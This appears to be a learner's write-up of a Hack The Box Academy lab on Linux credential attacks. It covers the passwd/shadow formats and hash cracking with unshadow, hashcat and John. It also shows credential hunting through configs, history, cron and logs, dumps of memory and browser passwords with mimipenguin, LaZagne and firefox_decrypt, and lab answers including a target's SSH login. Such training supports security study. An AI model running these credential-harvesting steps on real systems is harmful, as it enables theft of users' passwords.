# Extracting Passwords from Linux Systems

## Linux Authentication Process

The `pam_unix.so` module uses standardized API calls from system libraries to update account information. The primary files it reads from and writes to are `/etc/passwd` and `/etc/shadow`. PAM also includes many other service modules, such as those for LDAP, mount operations, and Kerberos authentication.

### Passwd file

The `/etc/passwd` file contains information about every user on the system and is readable by all users and services. Each entry in the file corresponds to a single user and consists of `seven fields`, which store user-related data in a structured format. These fields are separated by colons (`:`). As such, a typical entry may look something like this:

Linux Authentication Process

```shell-session
htb-student:x:1000:1000:,,,:/home/htb-student:/bin/bash
```

| Field                                              | Value               |
| -------------------------------------------------- | ------------------- |
| Username                                           | `htb-student`       |
| Password                                           | `x`                 |
| User ID                                            | `1000`              |
| Group ID                                           | `1000`              |
| [GECOS](https://en.wikipedia.org/wiki/Gecos_field) | `,,,`               |
| Home directory                                     | `/home/htb-student` |
| Default shell                                      | `/bin/bash`         |

The most relevant field for our purposes is the `Password` field, as it can contain different types of entries. In rare cases (generally on very old systems) this field may hold the actual password hash. On modern systems, however, password hashes are stored in the `/etc/shadow` file, which we'll examine later. Despite this, the `/etc/passwd` file is world-readable, giving attackers the ability to crack the passwords if hashes are stored here.

Usually, we will find the value `x` in this field, indicating that the passwords are stored in a hashed form within the `/etc/shadow` file. However, it can also be that the `/etc/passwd` file is writeable by mistake. This would allow us to remove the password field for the `root` user entirely.

```shell-session
eldeim@htb[/htb]$ head -n 1 /etc/passwd

root::0:0:root:/root:/bin/bash
```

This results in no password prompt being displayed when attempting to log in as `root`.

```shell-session
eldeim@htb[/htb]$ su

root@htb[/htb]#
```

Although the scenarios described are rare, we should still pay attention and watch for potential security gaps, as there are applications that require specific permissions fon entire folders. If the administrator has little experience with Linux (or the applications and their dependencies), they might mistakenly assign write permissions to the `/etc` directory and fail to correct them later.

### Shadow file

Since reading password hash values can put the entire system at risk, the `/etc/shadow` file was introduced. It has a similar format to `/etc/passwd` but is solely responsible for password storage and management. It contains all password information for created users. For example, if there is no entry in the `/etc/shadow` file for a user listed in `/etc/passwd`, that user is considered invalid. The `/etc/shadow` file is also only readable by users with administrative privileges. The format of this file is divided into the following `nine fields`:

```shell-session
htb-student:$y$j9T$3QSBB6CbHEu...SNIP...f8Ms:18955:0:99999:7:::
```

| Field             | Value                              |
| ----------------- | ---------------------------------- |
| Username          | `htb-student`                      |
| Password          | `$y$j9T$3QSBB6CbHEu...SNIP...f8Ms` |
| Last change       | `18955`                            |
| Min age           | `0`                                |
| Max age           | `99999`                            |
| Warning period    | `7`                                |
| Inactivity period | `-`                                |
| Expiration date   | `-`                                |
| Reserved field    | `-`                                |

If the `Password` field contains a character such as `!` or `*`, the user cannot log in using a Unix password. However, other authentication methods—such as Kerberos or key-based authentication—can still be used. The same applies if the `Password` field is empty, meaning no password is required for login. This can lead to certain programs denying access to specific functions. The `Password` field also follows a particular format, from which we can extract additional information:

* `$<id>$<salt>$<hashed>`

As we can see here, the hashed passwords are divided into three parts. The `ID` value specifies which cryptographic hash algorithm was used, typically one of the following:

| ID     | Cryptographic Hash Algorithm                                          |
| ------ | --------------------------------------------------------------------- |
| `1`    | [MD5](https://en.wikipedia.org/wiki/MD5)                              |
| `2a`   | [Blowfish](https://en.wikipedia.org/wiki/Blowfish_\(cipher\))         |
| `5`    | [SHA-256](https://en.wikipedia.org/wiki/SHA-2)                        |
| `6`    | [SHA-512](https://en.wikipedia.org/wiki/SHA-2)                        |
| `sha1` | [SHA1crypt](https://en.wikipedia.org/wiki/SHA-1)                      |
| `y`    | [Yescrypt](https://github.com/openwall/yescrypt)                      |
| `gy`   | [Gost-yescrypt](https://www.openwall.com/lists/yescrypt/2019/06/30/1) |
| `7`    | [Scrypt](https://en.wikipedia.org/wiki/Scrypt)                        |

Many Linux distributions, including Debian, now use `yescrypt` as the default hashing algorithm. On older systems, however, we may still encounter other hashing methods that can potentially be cracked. We'll discuss how the cracking process works shortly.

### Opasswd

The PAM library (`pam_unix.so`) can prevent users from reusing old passwords. These previous passwords are stored in the `/etc/security/opasswd` file. Administrator (root) privileges are required to read this file, assuming its permissions have not been modified manually.

```shell-session
eldeim@htb[/htb]$ sudo cat /etc/security/opasswd

cry0l1t3:1000:2:$1$HjFAfYTG$qNDkF0zJ3v8ylCOrKB0kt0,$1$kcUjWZJX$E9uMSmiQeRh4pAAgzuvkq1
```

Looking at the contents of this file, we can see that it contains several entries for the user `cry0l1t3`, separated by a comma (`,`). One critical detail to pay attention to is the type of hash that's been used. This is because the `MD5` (`$1$`) algorithm is significantly easier to crack than SHA-512. This is particularly important when identifying old passwords and recognizing patterns, as users often reuse similar passwords across multiple services or applications. Recognizing these patterns can greatly improve our chances of correctly guessing the password.

### Cracking Linux Credentials

Once we have root access on a Linux machine, we can gather user password hashes and attempt to crack them using various methods to recover the plaintext passwords. To do this, we can use a tool called [unshadow](https://github.com/pmittaldev/john-the-ripper/blob/master/src/unshadow.c), which is included with John the Ripper (JtR). It works by combining the `passwd` and `shadow` files into a single file suitable for cracking.

```shell-session
eldeim@htb[/htb]$ sudo cp /etc/passwd /tmp/passwd.bak 
eldeim@htb[/htb]$ sudo cp /etc/shadow /tmp/shadow.bak 
eldeim@htb[/htb]$ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```

This "unshadowed" file can now be attacked with either JtR or hashcat.

```shell-session
eldeim@htb[/htb]$ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```

Note: This is the exact scenario that JtR's `single crack mode` was designed for.

***

### Lab - Questions

{% embed url="https://academy.hackthebox.com/storage/modules/147/linux-authentication-process.zip" %}

* Download the attached ZIP file (linux-authentication-process.zip), and use single crack mode to find martin's password. What is it?

Fristly unzip the .zip getted -->

```
unzip linux-authentication-process.zip 
Archive:  linux-authentication-process.zip
  inflating: passwd                  
  inflating: shadow  
```

Now, unshadow it -->

```
unshadow passwd shadow > hashesh.txt
```

To conclude, crack it -->

```
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

***

## Credential Hunting in Linux

* `Files` including configs, databases, notes, scripts, source code, cronjobs, and SSH keys
* `History` including logs, and command-line history
* `Memory` including cache, and in-memory processing
* `Key-rings` such as browser stored credentials

### **Searching for configuration files**

The most crucial part of any system enumeration is to obtain an overview of it. Therefore, the first step should be to find all possible configuration files on the system, which we can then examine and analyze individually in more detail. There are many methods to find these configuration files, and with the following method, we will see we have reduced our search to these three file extensions.

```shell-session
eldeim@htb[/htb]$ for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

File extension:  .conf
/run/tmpfiles.d/static-nodes.conf
/run/NetworkManager/resolv.conf
/run/NetworkManager/no-stub-resolv.conf
/run/NetworkManager/conf.d/10-globally-managed-devices.conf
...SNIP...
/etc/ltrace.conf
/etc/rygel.conf
/etc/ld.so.conf.d/x86_64-linux-gnu.conf
/etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf
/etc/fprintd.conf

File extension:  .config
/usr/src/linux-headers-5.13.0-27-generic/.config
/usr/src/linux-headers-5.11.0-27-generic/.config
/usr/src/linux-hwe-5.13-headers-5.13.0-27/tools/perf/Makefile.config
/usr/src/linux-hwe-5.13-headers-5.13.0-27/tools/power/acpi/Makefile.config
/usr/src/linux-hwe-5.11-headers-5.11.0-27/tools/perf/Makefile.config
/usr/src/linux-hwe-5.11-headers-5.11.0-27/tools/power/acpi/Makefile.config
/home/cry0l1t3/.config
/etc/X11/Xwrapper.config
/etc/manpath.config

File extension:  .cnf
/etc/ssl/openssl.cnf
/etc/alternatives/my.cnf
/etc/mysql/my.cnf
/etc/mysql/debian.cnf
/etc/mysql/mysql.conf.d/mysqld.cnf
/etc/mysql/mysql.conf.d/mysql.cnf
/etc/mysql/mysql.cnf
/etc/mysql/conf.d/mysqldump.cnf
/etc/mysql/conf.d/mysql.cnf
```

Optionally, we can save the result in a text file and use it to examine the individual files one after the other. Another option is to run the scan directly for each file found with the specified file extension and output the contents. In this example, we search for three words (`user`, `password`, `pass`) in each file with the file extension `.cnf`.

```shell-session
eldeim@htb[/htb]$ for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done

File:  /snap/core18/2128/etc/ssl/openssl.cnf
challengePassword		= A challenge password

File:  /usr/share/ssl-cert/ssleay.cnf

File:  /etc/ssl/openssl.cnf
challengePassword		= A challenge password

File:  /etc/alternatives/my.cnf

File:  /etc/mysql/my.cnf

File:  /etc/mysql/debian.cnf

File:  /etc/mysql/mysql.conf.d/mysqld.cnf
user		= mysql

File:  /etc/mysql/mysql.conf.d/mysql.cnf

File:  /etc/mysql/mysql.cnf

File:  /etc/mysql/conf.d/mysqldump.cnf

File:  /etc/mysql/conf.d/mysql.cnf
```

### **Searching for databases**

We can apply this simple search to the other file extensions as well. Additionally, we can apply this search type to databases stored in files with different file extensions, and we can then read those.

```shell-session
eldeim@htb[/htb]$ for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done

DB File extension:  .sql

DB File extension:  .db
/var/cache/dictionaries-common/ispell.db
/var/cache/dictionaries-common/aspell.db
/var/cache/dictionaries-common/wordlist.db
/var/cache/dictionaries-common/hunspell.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/cert9.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/key4.db
/home/cry0l1t3/.cache/tracker/meta.db

DB File extension:  .*db
/var/cache/dictionaries-common/ispell.db
/var/cache/dictionaries-common/aspell.db
/var/cache/dictionaries-common/wordlist.db
/var/cache/dictionaries-common/hunspell.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/cert9.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/key4.db
/home/cry0l1t3/.config/pulse/3a1ee8276bbe4c8e8d767a2888fc2b1e-card-database.tdb
/home/cry0l1t3/.config/pulse/3a1ee8276bbe4c8e8d767a2888fc2b1e-device-volumes.tdb
/home/cry0l1t3/.config/pulse/3a1ee8276bbe4c8e8d767a2888fc2b1e-stream-volumes.tdb
/home/cry0l1t3/.cache/tracker/meta.db
/home/cry0l1t3/.cache/tracker/ontologies.gvdb

DB File extension:  .db*
/var/cache/dictionaries-common/ispell.db
/var/cache/dictionaries-common/aspell.db
/var/cache/dictionaries-common/wordlist.db
/var/cache/dictionaries-common/hunspell.db
/home/cry0l1t3/.dbus
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/cert9.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/key4.db
/home/cry0l1t3/.cache/tracker/meta.db-shm
/home/cry0l1t3/.cache/tracker/meta.db-wal
/home/cry0l1t3/.cache/tracker/meta.db
```

### **Searching for notes**

Depending on the environment we are in and the purpose of the host we are on, we can often find notes about specific processes on the system. These often include lists of many different access points or even their credentials. However, it is often challenging to find notes right away if stored somewhere on the system and not on the desktop or in its subfolders. This is because they can be named anything and do not have to have a specific file extension, such as `.txt`. Therefore, in this case, we need to search for files including the `.txt` file extension and files that have no file extension at all.

```shell-session
eldeim@htb[/htb]$ find /home/* -type f -name "*.txt" -o ! -name "*.*"

/home/cry0l1t3/.config/caja/desktop-metadata
/home/cry0l1t3/.config/clipit/clipitrc
/home/cry0l1t3/.config/dconf/user
/home/cry0l1t3/.mozilla/firefox/bh4w5vd0.default-esr/pkcs11.txt
/home/cry0l1t3/.mozilla/firefox/bh4w5vd0.default-esr/serviceworker.txt
<SNIP>
```

### **Searching for scripts**

Scripts are files that often contain highly sensitive information and processes. Among other things, these also contain credentials that are necessary to be able to call up and execute the processes automatically. Otherwise, the administrator or developer would have to enter the corresponding password each time the script or the compiled program is called.

```shell-session
eldeim@htb[/htb]$ for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done

File extension:  .py

File extension:  .pyc

File extension:  .pl

File extension:  .go

File extension:  .jar

File extension:  .c

File extension:  .sh
/snap/gnome-3-34-1804/72/etc/profile.d/vte-2.91.sh
/snap/gnome-3-34-1804/72/usr/bin/gettext.sh
/snap/core18/2128/etc/init.d/hwclock.sh
/snap/core18/2128/etc/wpa_supplicant/action_wpa.sh
/snap/core18/2128/etc/wpa_supplicant/functions.sh
<SNIP>
/etc/profile.d/xdg_dirs_desktop_session.sh
/etc/profile.d/cedilla-portuguese.sh
/etc/profile.d/im-config_wayland.sh
/etc/profile.d/vte-2.91.sh
/etc/profile.d/bash_completion.sh
/etc/profile.d/apps-bin-path.sh
```

### **Enumerating cronjobs**

Cronjobs are independent execution of commands, programs, scripts. These are divided into the system-wide area (`/etc/crontab`) and user-dependent executions. Some applications and scripts require credentials to run and are therefore incorrectly entered in the cronjobs. Furthermore, there are the areas that are divided into different time ranges (`/etc/cron.daily`, `/etc/cron.hourly`, `/etc/cron.monthly`, `/etc/cron.weekly`). The scripts and files used by `cron` can also be found in `/etc/cron.d/` for Debian-based distributions.

```shell-session
eldeim@htb[/htb]$ cat /etc/crontab 

# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
eldeim@htb[/htb]$ ls -la /etc/cron.*/

/etc/cron.d/:
total 28
drwxr-xr-x 1 root root  106  3. Jan 20:27 .
drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..
-rw-r--r-- 1 root root  201  1. Mär 2021  e2scrub_all
-rw-r--r-- 1 root root  331  9. Jan 2021  geoipupdate
-rw-r--r-- 1 root root  607 25. Jan 2021  john
-rw-r--r-- 1 root root  589 14. Sep 2020  mdadm
-rw-r--r-- 1 root root  712 11. Mai 2020  php
-rw-r--r-- 1 root root  102 22. Feb 2021  .placeholder
-rw-r--r-- 1 root root  396  2. Feb 2021  sysstat

/etc/cron.daily/:
total 68
drwxr-xr-x 1 root root  252  6. Jan 16:24 .
drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..
<SNIP>
```

### **Enumerating history files**

All history files provide crucial information about the current and past/historical course of processes. We are interested in the files that store users' command history and the logs that store information about system processes.

In the history of the commands entered on Linux distributions that use Bash as a standard shell, we find the associated files in `.bash_history`. Nevertheless, other files like `.bashrc` or `.bash_profile` can contain important information.

```shell-session
eldeim@htb[/htb]$ tail -n5 /home/*/.bash*

==> /home/cry0l1t3/.bash_history <==
vim ~/testing.txt
vim ~/testing.txt
chmod 755 /tmp/api.py
su
/tmp/api.py cry0l1t3 6mX4UP1eWH3HXK

==> /home/cry0l1t3/.bashrc <==
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi
```

### **Enumerating log files**

An essential concept of Linux systems is log files that are stored in text files. Many programs, especially all services and the system itself, write such files. In them, we find system errors, detect problems regarding services or follow what the system is doing in the background. The entirety of log files can be divided into four categories:

* Application logs
* Event logs
* Service logs
* System logs

Many different logs exist on the system. These can vary depending on the applications installed, but here are some of the most important ones:

| **File**              | **Description**                                    |
| --------------------- | -------------------------------------------------- |
| `/var/log/messages`   | Generic system activity logs.                      |
| `/var/log/syslog`     | Generic system activity logs.                      |
| `/var/log/auth.log`   | (Debian) All authentication related logs.          |
| `/var/log/secure`     | (RedHat/CentOS) All authentication related logs.   |
| `/var/log/boot.log`   | Booting information.                               |
| `/var/log/dmesg`      | Hardware and drivers related information and logs. |
| `/var/log/kern.log`   | Kernel related warnings, errors and logs.          |
| `/var/log/faillog`    | Failed login attempts.                             |
| `/var/log/cron`       | Information related to cron jobs.                  |
| `/var/log/mail.log`   | All mail server related logs.                      |
| `/var/log/httpd`      | All Apache related logs.                           |
| `/var/log/mysqld.log` | All MySQL server related logs.                     |

Covering the analysis of these log files in detail would be inefficient in this case. So at this point, we should familiarize ourselves with the individual logs, first examining them manually and understanding their formats. However, here are some strings we can use to find interesting content in the logs:

```shell-session
eldeim@htb[/htb]$ for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done

#### Log file:  /var/log/dpkg.log.1
2022-01-10 17:57:41 install libssh-dev:amd64 <none> 0.9.5-1+deb11u1
2022-01-10 17:57:41 status half-installed libssh-dev:amd64 0.9.5-1+deb11u1
2022-01-10 17:57:41 status unpacked libssh-dev:amd64 0.9.5-1+deb11u1 
2022-01-10 17:57:41 configure libssh-dev:amd64 0.9.5-1+deb11u1 <none> 
2022-01-10 17:57:41 status unpacked libssh-dev:amd64 0.9.5-1+deb11u1 
2022-01-10 17:57:41 status half-configured libssh-dev:amd64 0.9.5-1+deb11u1
2022-01-10 17:57:41 status installed libssh-dev:amd64 0.9.5-1+deb11u1
<SNIP>
```

## Memory and cache

### **Mimipenguin**

Many applications and processes work with credentials needed for authentication and store them either in memory or in files so that they can be reused. For example, it may be the system-required credentials for the logged-in users. Another example is the credentials stored in the browsers, which can also be read. In order to retrieve this type of information from Linux distributions, there is a tool called [mimipenguin](https://github.com/huntergregal/mimipenguin) that makes the whole process easier. However, this tool requires administrator/root permissions.

```shell-session
eldeim@htb[/htb]$ sudo python3 mimipenguin.py

[SYSTEM - GNOME]	cry0l1t3:WLpAEXFa0SbqOHY
```

### **LaZagne**

An even more powerful tool we can use that was mentioned earlier in the Credential Hunting in Windows section is `LaZagne`. This tool allows us to access far more resources and extract the credentials. The passwords and hashes we can obtain come from the following sources but are not limited to:

* Wifi
* Wpa\_supplicant
* Libsecret
* Kwallet
* Chromium-based
* CLI
* Mozilla
* Thunderbird
* Git
* ENV variables
* Grub
* Fstab
* AWS
* Filezilla
* Gftp
* SSH
* Apache
* Shadow
* Docker
* Keepass
* Mimipy
* Sessions
* Keyrings

For example, `Keyrings` are used for secure storage and management of passwords on Linux distributions. Passwords are stored encrypted and protected with a master password. It is an OS-based password manager, which we will discuss later in another section. This way, we do not need to remember every single password and can save repeated password entries.

```shell-session
eldeim@htb[/htb]$ sudo python2.7 laZagne.py all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Shadow passwords -----------------

[+] Hash found !!!
Login: systemd-coredump
Hash: !!:18858::::::

[+] Hash found !!!
Login: sambauser
Hash: $6$wgK4tGq7Jepa.V0g$QkxvseL.xkC3jo682xhSGoXXOGcBwPLc2CrAPugD6PYXWQlBkiwwFs7x/fhI.8negiUSPqaWyv7wC8uwsWPrx1:18862:0:99999:7:::

[+] Password found !!!
Login: cry0l1t3
Password: WLpAEXFa0SbqOHY


[+] 3 passwords have been found.
For more information launch it again with the -v option

elapsed time = 3.50091600418
```

### **Browser credentials**

Browsers store the passwords saved by the user in an encrypted form locally on the system to be reused. For example, the `Mozilla Firefox` browser stores the credentials encrypted in a hidden folder for the respective user. These often include the associated field names, URLs, and other valuable information.

For example, when we store credentials for a web page in the Firefox browser, they are encrypted and stored in `logins.json` on the system. However, this does not mean that they are safe there. Many employees store such login data in their browser without suspecting that it can easily be decrypted and used against the company.

```shell-session
[!bash]$ ls -l .mozilla/firefox/ | grep default 

drwx------ 11 cry0l1t3 cry0l1t3 4096 Jan 28 16:02 1bplpd86.default-release
drwx------  2 cry0l1t3 cry0l1t3 4096 Jan 28 13:30 lfx3lvhb.default
```

```shell-session
eldeim@htb[/htb]$ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .

{
  "nextId": 2,
  "logins": [
    {
      "id": 1,
      "hostname": "https://www.inlanefreight.com",
      "httpRealm": null,
      "formSubmitURL": "https://www.inlanefreight.com",
      "usernameField": "username",
      "passwordField": "password",
      "encryptedUsername": "MDoEEPgAAAA...SNIP...1liQiqBBAG/8/UpqwNlEPScm0uecyr",
      "encryptedPassword": "MEIEEPgAAAA...SNIP...FrESc4A3OOBBiyS2HR98xsmlrMCRcX2T9Pm14PMp3bpmE=",
      "guid": "{412629aa-4113-4ff9-befe-dd9b4ca388e2}",
      "encType": 1,
      "timeCreated": 1643373110869,
      "timeLastUsed": 1643373110869,
      "timePasswordChanged": 1643373110869,
      "timesUsed": 1
    }
  ],
  "potentiallyVulnerablePasswords": [],
  "dismissedBreachAlertsByLoginGUID": {},
  "version": 3
}
```

The tool [Firefox Decrypt](https://github.com/unode/firefox_decrypt) is excellent for decrypting these credentials, and is updated regularly. It requires Python 3.9 to run the latest version. Otherwise, `Firefox Decrypt 0.7.0` with Python 2 must be used.

```shell-session
eldeim@htb[/htb]$ python3.9 firefox_decrypt.py

Select the Mozilla profile you wish to decrypt
1 -> lfx3lvhb.default
2 -> 1bplpd86.default-release

2

Website:   https://testing.dev.inlanefreight.com
Username: 'test'
Password: 'test'

Website:   https://www.inlanefreight.com
Username: 'cry0l1t3'
Password: 'FzXUxJemKm6g2lGh'
```

Alternatively, `LaZagne` can also return results if the user has used the supported browser.

```shell-session
eldeim@htb[/htb]$ python3 laZagne.py browsers

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Firefox passwords -----------------

[+] Password found !!!
URL: https://testing.dev.inlanefreight.com
Login: test
Password: test

[+] Password found !!!
URL: https://www.inlanefreight.com
Login: cry0l1t3
Password: FzXUxJemKm6g2lGh


[+] 2 passwords have been found.
For more information launch it again with the -v option

elapsed time = 0.2310788631439209
```

***

### Lab - Questions

* Examine the target and find out the password of the user Will. Then, submit the password as the answer.

> SSH to 10.129.112.31 (ACADEMY-PWATTACKS-NIX01) with user "kira" and password "L0vey0u1!"

Fristly, see the bash history-->

<figure><img src="../../../.gitbook/assets/image (1386).png" alt=""><figcaption></figcaption></figure>

There is nothing... but have a hint about the management of this user, go to download firefox decrypt -->

Fristly, in us machine, git clone the repo and weak up a web server -->

<pre class="language-wasm"><code class="lang-wasm"><strong>### US KALI
</strong><strong>git clone https://github.com/Unode/firefox_decrypt.git
</strong>cd firefox_decrypt

### victim kali
wget https://raw.githubusercontent.com/robsheldon/firefox_decrypt/refs/heads/master/firefox_decrypt.py -O firefox_decrypt_fixed.py
chmod +x firefox_decrypt_fixed.py
</code></pre>

```
python3.9 firefox_decrypt_fixed.py
```

<figure><img src="../../../.gitbook/assets/image (1387).png" alt=""><figcaption></figcaption></figure>
